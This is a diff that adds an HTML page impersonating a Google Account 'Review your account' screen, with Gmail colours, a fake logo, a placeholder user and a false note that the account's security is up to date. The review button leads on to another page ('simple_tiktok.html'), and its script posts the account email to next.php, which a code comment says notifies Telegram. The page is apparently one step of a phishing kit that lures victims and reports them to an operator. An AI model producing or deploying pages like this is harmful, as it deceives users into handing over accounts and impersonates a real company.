@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* Gmail brand colors */
+            --gmail-blue: #1a73e8;
+            --gmail-red: #ea4335;
+            --gmail-yellow: #fbbc04;
+            --gmail-green: #34a853;
+            --gmail-white: #ffffff;
+            --gmail-gray: #5f6368;
+            --gmail-light-gray: #f1f3f4;
+            --gmail-border: #dadce0;
+        }
+
+        * { box-sizing: border-box; }
+
+        html, body {
+            margin: 0 !important;
+            padding: 0 !important;
+            width: 100% !important;
+            height: 100% !important;
+            overflow-x: hidden !important;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+            background: var(--gmail-light-gray) !important;
+            color: #202124 !important;
+            -webkit-font-smoothing: antialiased !important;
+            -moz-osx-font-smoothing: grayscale !important;
+        }
+
+        .gmail-container {
+            background: var(--gmail-white) !important;
+            box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px 3px rgba(60,64,67,.15) !important;
+            border-radius: 8px !important;
+            margin: 24px auto 0 !important;
+            padding: 48px 40px 36px !important;
+            width: 100% !important;
+            max-width: 450px !important;
+            min-height: 500px !important;
+            display: flex !important;
+            flex-direction: column !important;
+            justify-content: center !important;
+            align-items: center !important;
+            box-sizing: border-box !important;
+        }
+
+        .gmail-form {
+            width: 100% !important;
+            max-width: 360px !important;
+            margin: 0 auto !important;
+        }
+
+        .gmail-logo {
+            width: 75px !important;
+            height: 24px !important;
+            margin: 0 auto 24px !important;
+            display: block !important;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA3NSAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIyLjc1IDEySDE5djYuNDhoMy43NVoiIGZpbGw9IiMxQTczRTgiLz4KPHBhdGggZD0iTTIyLjc1IDI0SDE5VjE3LjYuNGgzLjc1VjI0WiIgZmlsbD0iIzM0QTg1MyIvPgo8cGF0aCBkPSJNMjIuNzUgMTEuNGgxOC41YzEuMDUgMCAxLjkyLjg3IDEuOTIgMS45MnYxOC41YzAgMS4wNS0uODcgMS45Mi0xLjkyIDEuOTJIMTUuNzVjLTEuMDUgMC0xLjkyLS44Ny0xLjkyLTEuOTJWMTMuMzJjMC0xLjA1Ljg3LTEuOTIgMS45Mi0xLjkyaDYuODN2My43NVoiIGZpbGw9IiNGQkJDMDQiLz4KPHBhdGggZD0iTTIyLjc1IDExLjRoMTguNWMxLjA1IDAgMS45Mi44NzEgMS45MiAxLjkyVjMwYzAgMS4wNS0uODcgMS45Mi0xLjkyIDEuOTJIMTUuNzVjLTEuMDUgMC0xLjkyLS44Ny0xLjkyLTEuOTJWMTMuMzJjMC0xLjA1Ljg3LTEuOTIgMS45Mi0xLjkyaDYuODN2My43NVoiIGZpbGw9IiNFQTQzMzUiLz4KPHBhdGggZD0iTTIyLjc1IDI0SDE5VjE3LjYuNGgzLjc1VjI0WiIgZmlsbD0iIzM0QTg1MyIvPgo8L3N2Zz4K') no-repeat center center !important;
+            background-size: contain !important;
+        }
+
+        .account-title {
+            font-size: 24px !important;
+            font-weight: 400 !important;
+            font-family: 'Roboto', sans-serif !important;
+            color: #202124 !important;
+            margin: 0 0 8px 0 !important;
+            text-align: center !important;
+        }
+
+        .account-subtitle {
+            font-size: 16px !important;
+            color: #5f6368 !important;
+            margin: 0 0 32px 0 !important;
+            text-align: center !important;
+        }
+
+        .account-details {
+            background: #f8f9fa !important;
+            border: 1px solid var(--gmail-border) !important;
+            border-radius: 8px !important;
+            padding: 20px !important;
+            margin: 24px 0 !important;
+        }
+
+        .account-info {
+            display: flex !important;
+            align-items: center !important;
+            margin-bottom: 16px !important;
+        }
+
+        .account-avatar {
+            width: 48px !important;
+            height: 48px !important;
+            border-radius: 50% !important;
+            background: var(--gmail-blue) !important;
+            color: var(--gmail-white) !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            font-size: 20px !important;
+            font-weight: 500 !important;
+            margin-right: 16px !important;
+        }
+
+        .account-text {
+            flex: 1 !important;
+        }
+
+        .account-name {
+            font-size: 16px !important;
+            font-weight: 500 !important;
+            color: #202124 !important;
+            margin-bottom: 2px !important;
+        }
+
+        .account-email {
+            font-size: 14px !important;
+            color: #5f6368 !important;
+        }
+
+        .account-stats {
+            display: grid !important;
+            grid-template-columns: 1fr 1fr !important;
+            gap: 16px !important;
+            margin-top: 20px !important;
+        }
+
+        .stat-item {
+            text-align: center !important;
+        }
+
+        .stat-number {
+            font-size: 24px !important;
+            font-weight: 500 !important;
+            color: var(--gmail-blue) !important;
+            margin-bottom: 4px !important;
+        }
+
+        .stat-label {
+            font-size: 12px !important;
+            color: #5f6368 !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.5px !important;
+        }
+
+        .gmail-review-btn {
+            width: 100% !important;
+            background: var(--gmail-blue) !important;
+            color: var(--gmail-white) !important;
+            border: none !important;
+            border-radius: 4px !important;
+            padding: 12px 24px !important;
+            font-size: 14px !important;
+            font-weight: 500 !important;
+            cursor: pointer !important;
+            margin-top: 24px !important;
+            text-transform: none !important;
+            text-decoration: none !important;
+            display: inline-block !important;
+            text-align: center !important;
+        }
+
+        .gmail-review-btn:hover {
+            background: #1557b0 !important;
+            text-decoration: none !important;
+            color: var(--gmail-white) !important;
+        }
+
+        .security-notice {
+            margin-top: 24px !important;
+            padding: 16px !important;
+            background: #e8f5e8 !important;
+            border: 1px solid #4caf50 !important;
+            border-radius: 4px !important;
+            font-size: 14px !important;
+            color: #2e7d32 !important;
+            text-align: center !important;
+        }
+
+        .security-icon {
+            font-size: 20px !important;
+            margin-bottom: 8px !important;
+        }
+
+        .footer-links {
+            margin-top: 32px !important;
+            text-align: center !important;
+        }
+
+        .footer-links a {
+            color: var(--gmail-blue) !important;
+            text-decoration: none !important;
+            font-size: 14px !important;
+            margin: 0 16px !important;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="gmail-container">
+        <div class="gmail-form">
+            <div class="gmail-logo"></div>
+            <h1 class="account-title">Review your account</h1>
+            <div class="account-subtitle">Check your account information and security settings</div>
+
+            <div class="account-details">
+                <div class="account-info">
+                    <div class="account-avatar">J</div>
+                    <div class="account-text">
+                        <div class="account-name">John Doe</div>
+                        <div class="account-email">john.doe@gmail.com</div>
+                    </div>
+                </div>
+
+                <div class="account-stats">
+                    <div class="stat-item">
+                        <div class="stat-number">1.2K</div>
+                        <div class="stat-label">Emails</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">47</div>
+                        <div class="stat-label">Contacts</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="security-notice">
+                <div class="security-icon">🔒</div>
+                <div>Your account security is up to date</div>
+            </div>
+
+            <a href="simple_tiktok.html" class="gmail-review-btn" onclick="startReview()">
+                Review your account
+            </a>
+
+            <div class="footer-links">
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Help</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function startReview() {
+            // Send review notification to Telegram
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'next.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('review=1&account=john.doe@gmail.com&status=Review Started');
+        }
+    </script>
+</body>
+</html>
